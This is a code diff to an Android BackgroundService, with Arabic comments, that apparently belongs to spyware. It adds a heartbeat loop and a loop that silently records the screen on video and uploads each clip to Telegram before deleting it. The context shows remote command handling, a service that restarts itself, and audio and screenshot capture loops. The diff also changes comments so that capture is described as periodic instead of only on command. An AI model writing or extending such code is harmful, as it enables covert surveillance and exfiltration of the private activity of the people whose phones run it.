@@ -22,6 +22,13 @@ class BackgroundService : Service() {
     private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
     private var running = true
 
+    companion object {
+        @Volatile
+        var autoVideoActive: Boolean = false
+        @Volatile
+        var autoVideoDuration: Int = 30
+    }
+
     override fun onCreate() {
         super.onCreate()
         startForegroundWithNotification()
@@ -30,7 +37,17 @@ class BackgroundService : Service() {
             CommandListener.start(applicationContext)
         } catch (_: Exception) {}
 
-        // حلقة التنظيف فقط — ما ترسل شي
+        // ⭐ Heartbeat — كل 3 دقائق
+        scope.launch {
+            while (running) {
+                try {
+                    DeviceManager.updateHeartbeat(applicationContext)
+                } catch (_: Exception) {}
+                delay(3 * 60_000L)
+            }
+        }
+
+        // حلقة التنظيف
         scope.launch {
             while (running) {
                 try {
@@ -44,12 +61,17 @@ class BackgroundService : Service() {
                         val cutoff = System.currentTimeMillis() - 60 * 60 * 1000L
                         screenDir.listFiles()?.forEach { if (it.lastModified() < cutoff) it.delete() }
                     }
+                    val videoDir = File(applicationContext.cacheDir, "videos")
+                    if (videoDir.exists()) {
+                        val cutoff = System.currentTimeMillis() - 30 * 60 * 1000L
+                        videoDir.listFiles()?.forEach { if (it.lastModified() < cutoff) it.delete() }
+                    }
                 } catch (_: Exception) {}
                 delay(5 * 60_000L)
             }
         }
 
-        // حلقة التسجيل — تشتغل فقط لو مفعّلة من الأمر
+        // حلقة التسجيل الصوتي
         scope.launch {
             while (running) {
                 try {
@@ -70,7 +92,7 @@ class BackgroundService : Service() {
             }
         }
 
-        // حلقة لقطات الشاشة — تشتغل فقط لو مفعّلة
+        // حلقة لقطات الشاشة الدورية
         scope.launch {
             while (running) {
                 try {
@@ -89,6 +111,31 @@ class BackgroundService : Service() {
                 }
             }
         }
+
+        // حلقة التسجيل التلقائي للفيديو
+        scope.launch {
+            while (running) {
+                try {
+                    if (autoVideoActive && ScreenCapture.isReady && !VideoRecorder.isRecording) {
+                        val duration = autoVideoDuration
+                        val start = VideoRecorder.start(applicationContext, duration)
+                        if (start != null) {
+                            delay((duration + 2) * 1000L)
+                            val done = VideoRecorder.stop() ?: start
+                            if (done.exists() && done.length() > 0) {
+                                TelegramApi.sendVideo(done, "🎥 تسجيل تلقائي (${duration}s)")
+                                done.delete()
+                            }
+                        }
+                        delay(5000L)
+                    } else {
+                        delay(5000L)
+                    }
+                } catch (_: Exception) {
+                    delay(10000L)
+                }
+            }
+        }
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY
@@ -98,6 +145,7 @@ class BackgroundService : Service() {
     override fun onDestroy() {
         running = false
         try { CommandListener.stop() } catch (_: Exception) {}
+        try { DeviceManager.markInactive(applicationContext) } catch (_: Exception) {}
         scope.cancel()
         try {
             val restart = Intent(applicationContext, BackgroundService::class.java)
